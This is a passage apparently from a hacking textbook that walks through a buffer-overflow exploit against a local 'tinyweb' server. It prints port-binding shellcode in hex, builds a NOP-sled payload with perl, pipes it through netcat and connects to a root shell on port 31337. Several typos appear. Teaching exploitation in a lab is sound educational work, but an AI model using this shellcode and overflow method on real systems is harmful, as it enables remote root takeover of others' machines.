+31 db 43 52 6a 01 6a 02 89 e1 cd 80 96 6a 66 58 | 1.CRj.j......jfX
+43 52 66 68 7a 69 66 53 89 e1 6a 10 51 56 89 e1 | CRfhzifS..j.QV..
+cd 80 b0 66 43 43 53 56 89 e1 cd 80 b0 66 43 52 | ...fCCSV.....fCR
+52 56 89 e1 cd 80 93 6a 02 59 b0 3f cd 80 49 79 | RV.....j.Y.?..Iy
+f9 b0 0b 52 68 2f 2f 73 68 68 2f 62 69 6e 89 e3 | ...Rh//shh/bin..
+52 89 e2 53 89 e1 cd 80 90 90 90 90 90 90 90 90 | R..S............
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................
+90 90 90 90 90 90 90 90 90 90 90 90 88 f6 ff bf | ................
+0d 0a
+| ..
+reader@hacking:~/booksrc $ nc -vv 127.0.0.1 31337
+localhost [127.0.0.1] 31337 (?) open
+whoami
+root
+ls -l /etc/passwd
+-rw-r--r-- 1 root root 1545 Sep 9 16:24 /etc/passwd
+
+Even though remote shell doesn't display a prompt, it still accepts commands and returns the output over the network. 
+
+A program like netcat can be used for many other things. It's designed to work like a console program, allowing standard input and output to be piped and redirected. Using netcat and tht port-binding shellcode in a file, the same exploit can be carried out on the command line.
+
+reader@hacking:~/booksrc $ wc -c portbinding_shellcode
+92 portbinding_shellcode
+reader@hacking:~/booksrc $ echo $((540+4 - 300 - 92))
+152
+reader@hacking:~/booksrc $ echo $((152 / 4))
+38
+reader@hacking:~/booksrc $ (perl -e 'print "\x90"x300';
+> cat portbinding_shellcode
+> perl -e 'print "\x88\xf6\xff\xbf"x38 . \r\n"')
+jfX 1 CRj j
+RfhzifS
+j QV
+fCCSV
+fCRRV
+jfXC
+j Y ? Iy
+Rh//shh/bin R S
+
+
+
+reader@hacking:~/booksrc $ (perl -e 'print "\x90"x300'; cat portbinding_shellcode;
+perl -e 'print "\x88\xf6\xff\xbf"x38 . "\r\n"') | nc -v -w1 127.0.0.1 80
+localhost [127.0.0.1] 80 (www) open
+reader@hacking:~/booksrc $ nc -v 127.0.0.1 31337
+localhost [127.0.0.1] 31337 (?) open
+whoami
+root
+
+In output above, first the length of the port-binding shellcode is shown to be 92 bytes. The return address is found 540 bytes from the start of the buffer, so with a 300-byte NOP sled and 92 bytes of shellcode, there are 152 bytes to the return address overwrite. 
+
+This means that if the target return address is repeated 38 times at the end of the buffer, the lats one should do the overwrite. 
+
+Finally, the buffer is terminated with '\r\n'.
+
+The commands that build the buffer are grouped with parentheses to pipe the buffer into netcat. 
+
+netcar connects to the tinyweb program and sends the buffer. After the shellcode runs, netcat needs to be broken out of by pressins CTRL-C, since the original socket connection sis still open. 
+
+Then netcat is used again to connect to the shell bound on port 31337 
+
